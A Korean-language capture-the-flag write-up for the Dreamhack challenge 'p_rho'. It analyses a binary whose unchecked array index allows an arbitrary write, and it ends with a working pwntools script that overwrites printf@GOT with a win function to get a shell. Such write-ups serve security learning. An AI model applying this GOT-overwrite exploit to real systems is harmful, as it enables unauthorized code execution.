# p_rho

[문제 링크](https://dreamhack.io/wargame/challenges/1617)

## 문제 분석

```sh
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

이번 문제는 실행 파일만 들어 있기 때문에 문제의 소스 코드를 보기위해 IDA를 통해 확인해 보았다.

메인 함수는 다음과 같이 간단히 되어있다.

```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // [rsp+8h] [rbp-18h] BYREF
  __int64 i; // [rsp+10h] [rbp-10h]
  unsigned __int64 v5; // [rsp+18h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  for ( i = 0; ; i = buf[i] )
  {
    printf("val: ");
    __isoc99_scanf("%lu", &v3);
    buf[i] = v3;
  }
}
```

사용자에게 입력받은 unsigned long 타입을 받아 buf[0]에 저장하고 다음 번에는 이전에 입력받은 값을 인덱스로 활용하여 또 다른 값을 넣는 방식이다.

- 첫 번째 루프 (i = 0):
  - 사용자에게 값을 입력받아 v3에 넣습니다.
  - buf[0] = v3; 가 실행됩니다.
  - 루프가 한 바퀴 돌고 나면 업데이트 구문인 i = buf[i]가 실행됩니다. 즉, i = buf[0]이 됩니다.
  - 결과적으로 다음 루프의 인덱스 i는 우리가 방금 입력한 v3 값이 됩니다.

- 두 번째 루프 (i = 조작한 값):
    - 다시 입력을 받아 v3에 넣습니다.
    - 이번에는 buf[조작한 인덱스] = v3; 가 실행됩니다.

C언어에서 buf[i]는 내부적으로 buf의 시작 주소 + (i * 8) (64비트 기준)로 계산됩니다. 인덱스 i에 대한 크기 검증(Bound Check)이 전혀 없으므로, i에 음수나 아주 큰 수를 넣어서 buf 배열을 벗어난 메모리의 어느 곳이든(예: GOT 영역) 값을 덮어쓸 수 있습니다.

이 프로그램을 살펴보면 다음과 같이 win 함수가 존재한다.

```c
unsigned __int64 win()
{
  char *argv[3]; // [rsp+0h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  argv[0] = "/bin/sh";
  argv[1] = 0;
  execve("/bin/sh", argv, 0);
  return v2 - __readfsqword(0x28u);
}
```

즉 PIE 보호 기법이 꺼져있으니, 이를 이용해 함수의 실제 메모리 주소가 저장되는 GOT(Global Offset Table) 의 printf got 주소를 조작해 win함수로 덮으면 쉘을 실행할 수 있을것이다.

## offset 계산

buf[i]가 printf@GOT를 가리키게 만들려면 i 값을 얼마로 주어야 할까?

  - 목표 주소(printf@GOT) = buf 시작 주소 + (i * 8)

따라서 i = (printf@GOT 주소 - buf 주소) / 8 이 된다.

전역 변수인 buf는 주로 .bss 영역(높은 주소)에 있고, GOT는 .got.plt 영역(낮은 주소)에 있기 때문에 이 계산 결과는 보통 음수가 나온다. scanf("%lu")는 음수(예: -5)를 입력하면 2의 보수로 자동 변환하여 메모리에 정확한 오프셋을 넣어주므로 걱정할 필요가 없다.

## 익스플로잇 코드

```python
from pwn import *
import sys

context.arch = 'amd64'

if len(sys.argv) == 3:
    p = remote(sys.argv[1], sys.argv[2])
else:
    p = process("./prob")

e = ELF('./prob')

win_addr = 0x4011B6

buf_addr = e.sym['buf']
printf_got = e.got['printf']

log.info(f"buf 주소: {hex(buf_addr)}")
log.info(f"printf GOT 주소: {hex(printf_got)}")

offset = int((printf_got - buf_addr) / 8)
log.info(f"계산된 인덱스 오프셋: {offset}")

p.sendlineafter(b"val: ", str(offset).encode())
p.sendlineafter(b"val: ", str(win_addr).encode())

p.interactive()
```